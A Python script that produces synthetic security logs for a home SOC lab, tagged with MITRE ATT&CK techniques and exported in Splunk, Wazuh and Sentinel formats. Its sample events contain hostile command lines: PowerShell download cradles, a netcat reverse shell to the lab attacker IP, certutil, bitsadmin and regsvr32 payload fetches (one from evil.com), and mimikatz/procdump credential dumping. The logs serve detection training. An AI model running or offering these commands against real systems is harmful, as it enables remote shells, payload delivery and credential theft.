#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║       SIEM LOG GENERATOR - Praharsh Edition v2.0            ║
║       Built for Multi-SIEM SOC Lab                          ║
║       Supports: Splunk | Wazuh | Microsoft Sentinel         ║
║       Lab Setup: Kali (Attacker) → Windows + Splunk (Target)║
╚══════════════════════════════════════════════════════════════╝

Author  : Praharsh Kumar
GitHub  : https://github.com/praharsh-kumar
LinkedIn: https://linkedin.com/in/praharshkumar
Lab     : Multi-VM SOC Lab (Kali + Windows + Splunk + Wazuh + ELK)

MITRE ATT&CK Coverage: 30+ Techniques across 11 Tactics
Event Types: 28 unique security event categories
Output Formats: JSON, CSV, Wazuh (JSON), Sentinel (JSON)
"""

import json
import random
import csv
import os
from datetime import datetime, timedelta

logs = []

# ============================================================
# LAB CONFIGURATION — Praharsh's Multi-VM SOC Lab
# ============================================================

# Your actual lab VM hostnames
hosts = [
    "WIN-PRAHARSH-01",     # Windows 10 VM (Target) - 192.168.56.105
    "SPLUNK-VM-01",        # Splunk Enterprise VM (Linux)
    "WAZUH-MANAGER-01",   # Wazuh Manager VM
    "ELK-SERVER-01",      # ELK Stack VM
    "KALI-LAB-01",        # Kali Linux (Attacker - for baseline noise)
    "WIN-DC-PRAHARSH",    # Simulated Domain Controller
    "FIN-SERVER-01",      # Simulated Finance Server
    "DEV-SERVER-01",      # Simulated Dev Server
]

# Simulated lab users
users = [
    "praharsh.admin",
    "lab.administrator",
    "svc.backup",
    "svc.splunk",
    "temp.analyst",
    "john.doe",
    "jane.smith",
    "finance.user",
    "dev.engineer",
    "attacker",          # Simulated threat actor
]

# Your actual lab IPs (from your ipconfig output)
internal_ips = [
    "192.168.56.105",    # Windows VM (Host-Only - your actual IP!)
    "192.168.56.101",    # Splunk VM
    "192.168.56.102",    # Wazuh VM
    "192.168.56.103",    # ELK VM
    "10.0.2.15",         # Windows VM (NAT)
    "10.0.2.10",
    "172.16.0.100",
]

attacker_ip = "192.168.56.104"  # Kali Linux (Attacker)

external_ips = [
    "103.45.78.21",
    "45.67.22.10",
    "185.220.101.45",
    "91.234.56.78",
    "23.129.64.100",
    "194.165.16.11",
    "77.73.133.84",
]

malicious_domains = [
    "evil-c2[.]com",
    "malware-drop[.]net",
    "phish-praharsh-lab[.]xyz",
    "data-exfil[.]io",
    "cobalt-beacon[.]onion",
    "mimikatz-payload[.]ru",
]

file_hashes = [
    "a1b2c3d4e5f6789012345678abcdef01",
    "deadbeef12345678cafebabe87654321",
    "0123456789abcdef0123456789abcdef",
    "5f4dcc3b5aa765d61d8327deb882cf99",
    "e10adc3949ba59abbe56e057f20f883e",
]

sysmon_processes = [
    "cmd.exe", "powershell.exe", "wscript.exe",
    "mshta.exe", "regsvr32.exe", "rundll32.exe",
    "certutil.exe", "bitsadmin.exe", "msiexec.exe",
    "cscript.exe", "wmic.exe",
]

def timestamp():
    return (datetime.now() - timedelta(minutes=random.randint(1, 7200))).isoformat()

def rand_severity():
    return random.choice(["Low", "Medium", "High", "Critical"])

# ============================================================
# 🔐 AUTHENTICATION EVENTS (Windows Security Logs)
# ============================================================

# Failed Login - Event ID 4625
for _ in range(200):
    logs.append({
        "timestamp": timestamp(),
        "event_code": 4625,
        "event_type": "Failed Login",
        "severity": "Medium",
        "user": random.choice(users),
        "host": random.choice(hosts),
        "source_ip": random.choice(external_ips + internal_ips),
        "logon_type": random.choice([2, 3, 10]),
        "failure_reason": random.choice(["Bad Password", "Unknown User", "Account Locked", "Account Disabled"]),
        "mitre_technique": "T1078",
        "log_source": "Windows Security",
        "lab_note": "Simulated brute-force noise"
    })

# Successful Login - Event ID 4624
for _ in range(150):
    logs.append({
        "timestamp": timestamp(),
        "event_code": 4624,
        "event_type": "Successful Login",
        "severity": "Info",
        "user": random.choice(users),
        "host": random.choice(hosts),
        "source_ip": random.choice(internal_ips),
        "logon_type": random.choice([2, 3, 10]),
        "log_source": "Windows Security",
    })

# Brute Force - T1110.001 (Hydra from Kali)
for _ in range(100):
    logs.append({
        "timestamp": timestamp(),
        "event_code": 4625,
        "event_type": "Brute Force Attempt",
        "severity": "High",
        "user": "lab.administrator",
        "host": "WIN-PRAHARSH-01",
        "source_ip": attacker_ip,       # Kali attacking Windows VM
        "destination_ip": "192.168.56.105",
        "attempt_count": random.randint(50, 500),
        "tool": "Hydra",
        "mitre_technique": "T1110.001",
        "log_source": "Windows Security",
        "lab_attack": True,
        "attacker_host": "KALI-LAB-01"
    })

# RDP Brute Force - T1110.003 (from your lab attack plan!)
for _ in range(80):
    logs.append({
        "timestamp": timestamp(),
        "event_code": 4625,
        "event_type": "RDP Brute Force",
        "severity": "High",
        "user": random.choice(users),
        "host": "WIN-PRAHARSH-01",
        "source_ip": attacker_ip,
        "destination_port": 3389,
        "attempt_count": random.randint(20, 300),
        "tool": "Hydra / CrackMapExec",
        "mitre_technique": "T1110.003",
        "log_source": "Windows Security",
        "lab_attack": True,
    })

# SSH Brute Force against Splunk VM - T1110.001
for _ in range(80):
    logs.append({
        "timestamp": timestamp(),
        "event_type": "SSH Brute Force",
        "severity": "High",
        "user": random.choice(["root", "splunk", "admin", "ubuntu"]),
        "host": "SPLUNK-VM-01",
        "source_ip": attacker_ip,
        "destination_port": 22,
        "attempt_count": random.randint(30, 400),
        "tool": "Hydra",
        "mitre_technique": "T1110.001",
        "log_source": "Linux Auth",
        "lab_attack": True,
    })

# Kerberoasting - T1558.003
for _ in range(30):
    logs.append({
        "timestamp": timestamp(),
        "event_code": 4769,
        "event_type": "Kerberos TGS Request",
        "severity": "High",
        "user": random.choice(users),
        "host": "WIN-DC-PRAHARSH",
        "service_name": random.choice(["svc.splunk", "svc.backup", "svc.sql"]),
        "encryption_type": "0x17",
        "mitre_technique": "T1558.003",
        "log_source": "Windows Security",
    })

# Password Spray - T1110.003
for _ in range(80):
    logs.append({
        "timestamp": timestamp(),
        "event_code": 4625,
        "event_type": "Password Spray",
        "severity": "High",
        "user": random.choice(users),
        "host": "WIN-DC-PRAHARSH",
        "source_ip": attacker_ip,
        "mitre_technique": "T1110.003",
        "log_source": "Windows Security",
        "lab_attack": True,
    })

# ============================================================
# ⚡ SYSMON EVENTS (Your Sysmon is installed on Windows VM!)
# ============================================================

# Sysmon Event ID 1 - Process Create (Mimikatz)
for _ in range(40):
    logs.append({
        "timestamp": timestamp(),
        "event_code": 1,
        "event_type": "Sysmon Process Create",
        "severity": "Critical",
        "process": random.choice(["mimikatz.exe", "procdump.exe", "meterpreter.exe"]),
        "command_line": random.choice([
            "mimikatz.exe sekurlsa::logonpasswords",
            "mimikatz.exe lsadump::sam",
            "procdump.exe -ma lsass.exe lsass.dmp",
        ]),
        "parent_process": "cmd.exe",
        "host": "WIN-PRAHARSH-01",
        "user": "praharsh.admin",
        "process_id": random.randint(1000, 9999),
        "mitre_technique": "T1003.001",
        "log_source": "Sysmon",
        "lab_attack": True,
    })

# Sysmon Event ID 3 - Network Connection
for _ in range(60):
    logs.append({
        "timestamp": timestamp(),
        "event_code": 3,
        "event_type": "Sysmon Network Connection",
        "severity": random.choice(["Medium", "High"]),
        "process": random.choice(sysmon_processes),
        "source_ip": "192.168.56.105",
        "destination_ip": random.choice(external_ips + [attacker_ip]),
        "destination_port": random.choice([4444, 8080, 443, 1337, 9001]),
        "host": "WIN-PRAHARSH-01",
        "user": random.choice(users),
        "mitre_technique": "T1071.001",
        "log_source": "Sysmon",
    })

# Sysmon Event ID 7 - Image Loaded (DLL)
for _ in range(30):
    logs.append({
        "timestamp": timestamp(),
        "event_code": 7,
        "event_type": "Sysmon Image Load",
        "severity": "High",
        "image": random.choice(["C:\\Windows\\Temp\\malicious.dll", "C:\\Users\\Public\\payload.dll"]),
        "process": random.choice(sysmon_processes),
        "signed": False,
        "host": "WIN-PRAHARSH-01",
        "mitre_technique": "T1055.001",
        "log_source": "Sysmon",
    })

# Sysmon Event ID 11 - File Create
for _ in range(40):
    logs.append({
        "timestamp": timestamp(),
        "event_code": 11,
        "event_type": "Sysmon File Create",
        "severity": "Medium",
        "file_path": random.choice([
            "C:\\Windows\\Temp\\payload.exe",
            "C:\\Users\\Public\\shell.ps1",
            "C:\\ProgramData\\malware.bat",
        ]),
        "process": random.choice(sysmon_processes),
        "host": "WIN-PRAHARSH-01",
        "user": random.choice(users),
        "mitre_technique": "T1105",
        "log_source": "Sysmon",
    })

# Sysmon Event ID 13 - Registry Set
for _ in range(40):
    logs.append({
        "timestamp": timestamp(),
        "event_code": 13,
        "event_type": "Sysmon Registry Set",
        "severity": "High",
        "registry_key": random.choice([
            "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        ]),
        "value": random.choice(["C:\\Windows\\Temp\\backdoor.exe", "powershell -enc AAAA"]),
        "process": random.choice(sysmon_processes),
        "host": "WIN-PRAHARSH-01",
        "mitre_technique": "T1547.001",
        "log_source": "Sysmon",
    })

# ============================================================
# 🐚 REVERSE SHELL & EXECUTION (From your lab attack plan!)
# ============================================================

# Reverse Shell - T1059 (msfvenom payload)
for _ in range(50):
    logs.append({
        "timestamp": timestamp(),
        "event_code": 1,
        "event_type": "Reverse Shell Detected",
        "severity": "Critical",
        "command_line": random.choice([
            "powershell -nop -c IEX(New-Object Net.WebClient).DownloadString(\'http://192.168.56.104:8080/shell.ps1\')",
            "cmd.exe /c nc.exe 192.168.56.104 4444 -e cmd.exe",
            "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=4444",
        ]),
        "source_ip": "192.168.56.105",
        "destination_ip": attacker_ip,
        "destination_port": random.choice([4444, 4445, 9001]),
        "host": "WIN-PRAHARSH-01",
        "user": random.choice(users),
        "mitre_technique": "T1059.001",
        "tool": "Metasploit / Netcat",
        "log_source": "Sysmon",
        "lab_attack": True,
    })

# Encoded PowerShell - T1059.001
for _ in range(80):
    logs.append({
        "timestamp": timestamp(),
        "event_code": 4104,
        "event_type": "PowerShell Execution",
        "severity": "High",
        "command": random.choice([
            "powershell.exe -enc SQBFAFgA",
            "powershell -nop -w hidden -c IEX",
            "powershell.exe -ep bypass -file C:\\shell.ps1",
            "powershell Invoke-Mimikatz",
            "powershell -c (New-Object Net.WebClient).DownloadFile",
        ]),
        "host": random.choice(hosts),
        "user": random.choice(users),
        "mitre_technique": "T1059.001",
        "log_source": "Windows PowerShell",
    })

# LOLBIN Execution - T1218
for _ in range(50):
    logs.append({
        "timestamp": timestamp(),
        "event_code": 1,
        "event_type": "LOLBIN Execution",
        "severity": "High",
        "process": random.choice(["mshta.exe", "regsvr32.exe", "certutil.exe", "msiexec.exe", "bitsadmin.exe"]),
        "command_line": random.choice([
            "certutil -urlcache -split -f http://192.168.56.104/mal.exe C:\\Windows\\Temp\\mal.exe",
            "regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll",
            "mshta vbscript:Execute(\"CreateObject(\"Wscript.Shell\").Run\")",
            "bitsadmin /transfer job /download /priority normal http://192.168.56.104/shell.exe",
        ]),
        "host": "WIN-PRAHARSH-01",
        "user": random.choice(users),
        "mitre_technique": "T1218",
        "log_source": "Sysmon",
        "lab_attack": True,
    })

# Nmap Port Scan - T1046 (from your attack plan step 1!)
for _ in range(40):
    logs.append({
        "timestamp": timestamp(),
        "event_type": "Port Scan Detected",
        "severity": "Medium",
        "source_ip": attacker_ip,
        "target_ip": random.choice(["192.168.56.105", "192.168.56.101"]),
        "ports_scanned": random.randint(100, 65535),
        "scan_type": random.choice(["SYN Scan", "TCP Connect", "UDP Scan", "Version Scan", "OS Detection"]),
        "tool": "Nmap",
        "mitre_technique": "T1046",
        "log_source": "Firewall / IDS",
        "lab_attack": True,
    })

# ============================================================
# 🔼 PRIVILEGE ESCALATION (T1068 - Your lab attack step 6!)
# ============================================================

for _ in range(35):
    logs.append({
        "timestamp": timestamp(),
        "event_code": 4672,
        "event_type": "Privilege Escalation",
        "severity": "Critical",
        "user": random.choice(users),
        "privileges_assigned": random.choice([
            "SeDebugPrivilege",
            "SeTcbPrivilege",
            "SeBackupPrivilege",
            "SeImpersonatePrivilege",
            "SeRestorePrivilege",
        ]),
        "host": random.choice(hosts),
        "mitre_technique": "T1068",
        "log_source": "Windows Security",
        "lab_attack": True,
    })

# ============================================================
# 🌐 LATERAL MOVEMENT
# ============================================================

# RDP Lateral Movement
for _ in range(60):
    src = random.choice(hosts)
    dst = random.choice([h for h in hosts if h != src])
    logs.append({
        "timestamp": timestamp(),
        "event_code": 4624,
        "event_type": "RDP Login",
        "severity": "Medium",
        "user": random.choice(users),
        "source_host": src,
        "destination_host": dst,
        "source_ip": random.choice(internal_ips),
        "logon_type": 10,
        "mitre_technique": "T1021.001",
        "log_source": "Windows Security",
    })

# PsExec - T1570
for _ in range(40):
    logs.append({
        "timestamp": timestamp(),
        "event_code": 7045,
        "event_type": "PsExec Detected",
        "severity": "High",
        "service_name": "PSEXESVC",
        "source_host": "WIN-PRAHARSH-01",
        "destination_host": random.choice(hosts),
        "user": random.choice(users),
        "mitre_technique": "T1570",
        "log_source": "Sysmon",
    })

# WMI Remote Execution - T1047
for _ in range(35):
    logs.append({
        "timestamp": timestamp(),
        "event_code": 1,
        "event_type": "WMI Remote Execution",
        "severity": "High",
        "process": "wmiprvse.exe",
        "command_line": "wmic /node:TARGET process call create cmd.exe",
        "source_host": random.choice(hosts),
        "destination_host": random.choice(hosts),
        "user": random.choice(users),
        "mitre_technique": "T1047",
        "log_source": "Sysmon",
    })

# ============================================================
# 📤 C2 & EXFILTRATION
# ============================================================

# C2 Outbound - T1071.001
for _ in range(80):
    logs.append({
        "timestamp": timestamp(),
        "event_type": "C2 Outbound Connection",
        "severity": "Critical",
        "source_ip": "192.168.56.105",
        "destination_ip": random.choice(external_ips + [attacker_ip]),
        "destination_port": random.choice([4444, 8080, 443, 8443, 1337, 9001]),
        "destination_domain": random.choice(malicious_domains),
        "bytes_sent": random.randint(100000, 8000000),
        "host": "WIN-PRAHARSH-01",
        "protocol": random.choice(["TCP", "HTTPS"]),
        "mitre_technique": "T1071.001",
        "log_source": "Firewall / Sysmon",
        "lab_attack": True,
    })

# DNS Tunneling - T1071.004
for _ in range(50):
    logs.append({
        "timestamp": timestamp(),
        "event_type": "DNS Tunneling Detected",
        "severity": "Critical",
        "dns_query": f"{random.choice(['aGVsbG8','ZXhmaWw','YmFzZTY0'])}.{random.choice(malicious_domains)}",
        "query_type": "TXT",
        "query_count": random.randint(100, 1000),
        "host": random.choice(hosts),
        "mitre_technique": "T1071.004",
        "log_source": "DNS / Zeek",
    })

# Data Exfiltration - T1048
for _ in range(40):
    logs.append({
        "timestamp": timestamp(),
        "event_type": "Data Exfiltration Suspected",
        "severity": "Critical",
        "destination_ip": random.choice(external_ips),
        "bytes_transferred": random.randint(50000000, 500000000),
        "protocol": random.choice(["HTTPS", "FTP", "SFTP"]),
        "host": random.choice(hosts),
        "user": random.choice(users),
        "mitre_technique": "T1048",
        "log_source": "Firewall",
    })

# ============================================================
# 🛡️ ENDPOINT EVENTS
# ============================================================

# Mimikatz / Credential Dump - T1003
for _ in range(40):
    logs.append({
        "timestamp": timestamp(),
        "event_code": 10,
        "event_type": "Credential Dumping",
        "severity": "Critical",
        "process": random.choice(["mimikatz.exe", "procdump.exe", "comsvcs.dll"]),
        "target_process": "lsass.exe",
        "access_type": "0x1010",
        "host": "WIN-PRAHARSH-01",
        "user": random.choice(users),
        "mitre_technique": "T1003.001",
        "log_source": "Sysmon Event ID 10",
        "lab_attack": True,
    })

# Malware Detection
for _ in range(60):
    logs.append({
        "timestamp": timestamp(),
        "event_type": "Malware Detected",
        "severity": "High",
        "malware_name": random.choice([
            "Trojan.GenericKD", "Cobalt.Strike.Beacon",
            "Mimikatz", "Emotet", "Meterpreter",
            "Ryuk.Ransomware", "RedLineStealer",
        ]),
        "file_path": random.choice([
            "C:\\Users\\Public\\malware.exe",
            "C:\\Windows\\Temp\\payload.dll",
            "C:\\Users\\praharsh.admin\\Downloads\\invoice.exe",
        ]),
        "file_hash": random.choice(file_hashes),
        "action_taken": random.choice(["Quarantined", "Blocked", "Cleaned", "Detected"]),
        "host": random.choice(hosts),
        "log_source": "Windows Defender / Wazuh",
    })

# Process Injection - T1055
for _ in range(30):
    logs.append({
        "timestamp": timestamp(),
        "event_code": 8,
        "event_type": "Process Injection",
        "severity": "Critical",
        "source_process": random.choice(sysmon_processes),
        "target_process": random.choice(["explorer.exe", "svchost.exe", "notepad.exe", "lsass.exe"]),
        "injection_type": random.choice(["DLL Injection", "Process Hollowing", "APC Injection"]),
        "host": random.choice(hosts),
        "mitre_technique": "T1055",
        "log_source": "Sysmon Event ID 8",
    })

# Ransomware
for _ in range(30):
    logs.append({
        "timestamp": timestamp(),
        "event_type": "Ransomware Activity",
        "severity": "Critical",
        "indicator": random.choice([
            "Mass file encryption detected",
            "Ransom note created: README_DECRYPT.txt",
            "Shadow copies deleted via vssadmin",
            "Volume shadow service stopped",
        ]),
        "files_affected": random.randint(1000, 50000),
        "host": random.choice(hosts),
        "mitre_technique": "T1486",
        "log_source": "Sysmon / EDR",
    })

# ============================================================
# ☁️ CLOUD & NETWORK EVENTS
# ============================================================

# Cloud IAM
for _ in range(40):
    logs.append({
        "timestamp": timestamp(),
        "event_type": "Cloud IAM Change",
        "severity": "High",
        "user": "temp.analyst",
        "action": random.choice(["AttachAdminPolicy", "CreateAccessKey", "AssumeRole"]),
        "cloud_provider": random.choice(["AWS", "Azure", "GCP"]),
        "resource": random.choice(["iam:user/temp.analyst", "ec2:sg-12345", "s3:bucket/sensitive-data"]),
        "mitre_technique": "T1098",
        "log_source": "CloudTrail / Azure AD",
    })

# Impossible Travel
for _ in range(30):
    logs.append({
        "timestamp": timestamp(),
        "event_type": "Impossible Travel",
        "severity": "High",
        "user": random.choice(users),
        "login_location_1": random.choice(["India", "United States", "Germany"]),
        "login_location_2": random.choice(["Russia", "China", "North Korea"]),
        "time_difference_minutes": random.randint(5, 30),
        "cloud_provider": random.choice(["Azure AD", "Okta"]),
        "mitre_technique": "T1078.004",
        "log_source": "Azure AD / Okta",
    })

# Firewall Blocks
for _ in range(100):
    logs.append({
        "timestamp": timestamp(),
        "event_type": "Firewall Block",
        "severity": "Low",
        "source_ip": random.choice(external_ips + [attacker_ip]),
        "destination_ip": random.choice(internal_ips),
        "destination_port": random.choice([22, 23, 3389, 445, 1433, 4444]),
        "protocol": random.choice(["TCP", "UDP"]),
        "action": "BLOCK",
        "rule_name": random.choice([
            "Block-SSH-External", "Block-RDP", "Block-SMB",
            "Block-Kali-Attacker", "Block-C2-Ports",
        ]),
        "log_source": "Firewall / UFW",
    })

# IDS Alerts
for _ in range(60):
    logs.append({
        "timestamp": timestamp(),
        "event_type": "IDS Alert",
        "severity": random.choice(["Medium", "High", "Critical"]),
        "signature": random.choice([
            "ET MALWARE CobaltStrike Beacon",
            "ET TROJAN Metasploit Meterpreter",
            "ET EXPLOIT CVE-2021-44228 Log4j",
            "ET SCAN Nmap Detected",
            "ET POLICY Outbound SSH Connection",
            "SURICATA HTTP Reverse Shell Detected",
        ]),
        "source_ip": random.choice(internal_ips + [attacker_ip]),
        "destination_ip": random.choice(external_ips),
        "signature_id": random.randint(2000000, 2999999),
        "log_source": "Suricata / Snort",
    })

# ============================================================
# 📧 EMAIL SECURITY
# ============================================================

for _ in range(50):
    logs.append({
        "timestamp": timestamp(),
        "event_type": "Phishing Email",
        "severity": "High",
        "sender": random.choice([
            "hr-support@secure-login[.]com",
            "it-helpdesk@micr0soft[.]com",
            "ceo@company-update[.]net",
        ]),
        "recipient": f"{random.choice(users)}@praharsh-lab.local",
        "subject": random.choice([
            "Urgent Password Reset Required",
            "Invoice #12345 Attached",
            "Your account has been compromised",
            "ACTION REQUIRED: Verify your identity",
        ]),
        "attachment": random.choice(["invoice.xlsm", "document.docm", "reset_password.html", None]),
        "mitre_technique": "T1566.001",
        "log_source": "Email Gateway",
    })

# ============================================================
# 🔧 WAZUH-SPECIFIC EVENTS
# ============================================================

for _ in range(50):
    logs.append({
        "timestamp": timestamp(),
        "event_type": "Wazuh Alert",
        "severity": random.choice(["Medium", "High", "Critical"]),
        "wazuh_rule_id": random.choice([100002, 100003, 5710, 5712, 31101, 40101]),
        "wazuh_rule_desc": random.choice([
            "Multiple failed SSH logins",
            "Rootkit detection attempt",
            "File integrity monitoring alert",
            "Suspicious process spawned",
            "Privilege escalation detected",
        ]),
        "agent_name": random.choice(hosts),
        "agent_ip": random.choice(internal_ips),
        "log_source": "Wazuh Manager",
    })

# ============================================================
# 📊 SHUFFLE & EXPORT
# ============================================================

random.shuffle(logs)

os.makedirs("output", exist_ok=True)

# JSON output
with open("output/praharsh_siem_logs_3000.json", "w", encoding="utf-8") as f:
    json.dump(logs, f, indent=2)

# CSV output
all_keys = set()
for log in logs:
    all_keys.update(log.keys())
all_keys = sorted(all_keys)

with open("output/praharsh_siem_logs_3000.csv", "w", newline="", encoding="utf-8") as f:
    writer = csv.DictWriter(f, fieldnames=all_keys)
    writer.writeheader()
    for log in logs:
        writer.writerow({k: log.get(k, "") for k in all_keys})

# Wazuh-format JSON
wazuh_logs = []
for log in logs:
    wazuh_logs.append({
        "timestamp": log.get("timestamp"),
        "rule": {
            "level": 12 if log.get("severity") == "Critical" else 8 if log.get("severity") == "High" else 5,
            "description": log.get("event_type"),
            "id": str(log.get("event_code", random.randint(100000, 999999))),
            "mitre": {"technique": [log.get("mitre_technique", "T1000")]}
        },
        "agent": {
            "name": log.get("host", "unknown"),
            "ip": log.get("source_ip", "0.0.0.0"),
        },
        "data": {k: v for k, v in log.items() if k not in ["timestamp", "event_type", "severity"]}
    })

with open("output/praharsh_siem_logs_wazuh.json", "w", encoding="utf-8") as f:
    json.dump(wazuh_logs, f, indent=2)

# Sentinel KQL-ready JSON
sentinel_logs = []
for log in logs:
    sentinel_logs.append({
        "TimeGenerated": log.get("timestamp"),
        "EventType": log.get("event_type"),
        "Severity": log.get("severity"),
        "EventCode": log.get("event_code"),
        "UserAccount": log.get("user"),
        "Computer": log.get("host"),
        "SourceIP": log.get("source_ip"),
        "DestinationIP": log.get("destination_ip"),
        "MitreTechnique": log.get("mitre_technique"),
        "LogSource": log.get("log_source"),
        "IsLabAttack": log.get("lab_attack", False),
        "CommandLine": log.get("command_line", log.get("command")),
        "ProcessName": log.get("process"),
        "MalwareName": log.get("malware_name"),
        "FileHash": log.get("file_hash"),
        "ToolUsed": log.get("tool"),
    })

with open("output/praharsh_siem_logs_sentinel.json", "w", encoding="utf-8") as f:
    json.dump(sentinel_logs, f, indent=2)

print(f"✅ Generated {len(logs)} SIEM logs")
print(f"📁 Files:")
print(f"   output/praharsh_siem_logs_3000.json      (Full JSON)")
print(f"   output/praharsh_siem_logs_3000.csv       (Splunk/CSV)")
print(f"   output/praharsh_siem_logs_wazuh.json     (Wazuh format)")
print(f"   output/praharsh_siem_logs_sentinel.json  (Sentinel KQL-ready)")

event_counts = {}
for log in logs:
    et = log.get("event_type", "Unknown")
    event_counts[et] = event_counts.get(et, 0) + 1

print(f"\n📊 Event Type Summary:")
for et, count in sorted(event_counts.items(), key=lambda x: -x[1]):
    print(f"   {et}: {count}")
